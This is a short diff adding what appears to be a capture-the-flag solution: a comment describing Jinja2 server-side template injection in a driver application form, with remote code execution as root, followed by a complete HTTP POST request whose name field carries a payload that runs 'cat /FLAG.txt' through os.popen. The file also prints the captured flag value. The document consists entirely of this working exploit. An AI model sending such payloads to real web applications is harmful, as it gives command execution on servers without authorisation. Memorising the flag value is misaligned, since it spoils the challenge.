@@ -1,0 +1,8 @@
+# Jinja2 SSTI in name field of driver application form. Uses lipsum.__globals__['os'].popen() for RCE. Runs as root. Extracts flag{43509ba5-dc71-4a57-b55d-96e228e4ddfe} from /FLAG.txt
+
+POST /submit HTTP/1.1
+Host: 172.17.0.1:35841
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 128
+
+name={{lipsum.__globals__['os'].popen('cat /FLAG.txt').read()}}&email=test@test.com&phone=1234567890&experience=5&license=ABC123
